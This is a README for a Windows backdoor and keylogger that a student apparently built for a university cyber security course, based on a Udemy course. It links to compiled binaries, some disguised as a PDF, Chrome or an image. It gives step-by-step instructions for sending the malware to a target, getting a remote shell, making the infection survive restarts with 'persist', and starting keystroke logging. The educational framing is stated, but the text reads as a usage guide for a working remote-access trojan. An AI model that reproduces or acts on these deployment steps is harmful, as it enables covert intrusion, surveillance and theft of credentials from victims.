ABOUT THE KEY LOGGER
--------------------
This Malware has been created as part of a learning activity through UNSW's ZZEN9201 Foundations of Cyber Security. 
It was created by following the Udemy 'Build Undetectable Malware Using C Language: Ethical Hacking':
https://www.udemy.com/course/build-undetectable-malware-using-c-language-ethical-hacking/


COMPONENTS
----------
The Server
- source code: server.c
- Built for Kali Linux environment
- Run on the attacker computer
- Opens a socket and listens for a connection from the target computer
- Connects to the target computer
- Once connected, allows the attacker to implement the following commands:
    o	Quit the program on the target computer
    o  	Search the target computer directories
    o	Send terminal commands and receive the result
    o	Start the keylogger
    o	Set the key logger program to start whenever the target computer starts up


The Malware
- sourcecode: backdoor.c, keylogger.h
- Built for Windows environment
- Can be disguised as other file types
- Runs on the target computer
- Connects to the attackers listening socket when the .exe file is run
- Reads the commands sent from the server and implements it 
- Calls the keylogger method when commanded
- Runs without opening any window
- Advises the used they have been hacked by Emily


HOW TO RUN
----------
The Server
- Download the server program from https://unsw-my.sharepoint.com/:u:/g/personal/z5354950_ad_unsw_edu_au1/EbiCOedUEGxHjgmWSNDfUq8BHoM5nIOUwYPXY99PA21Lpg?e=ofHkBg
- In a Kali Linux terminal navigate to the folder the the server program is saved 
- Type ./server and hit enter
- The server is now listening for a connect from the target computer

The Malware
- Download the malware program from https://unsw-my.sharepoint.com/:u:/g/personal/z5354950_ad_unsw_edu_au1/EU_7dW0ATG5JkmHpTRb63UQBtwfeGHe3PMjOs8GyFsZIcA?e=YR6CKd
- You can also download the malware program disguised as a pdf, google chrome or an image from https://unsw-my.sharepoint.com/:f:/g/personal/z5354950_ad_unsw_edu_au1/Ehf4LMGUeGtCg9-hYEWIm7kB70hWvTXzodfAvmTCcDDwMQ?e=FJXUSu
- Send the malware program to your target and wait for them to open the program
- You will get a notification on your server end when the target connects.

Commands
- You can use normal terminal commands to navigate the target computer and get information about the target computer (e.g cd and ifconfig)
- To make the malware start each time the target computer turns on, the command is 'persist'
- To start the keylogger, the command is 'keylog_start'
- To quit, type 'q' and hit enter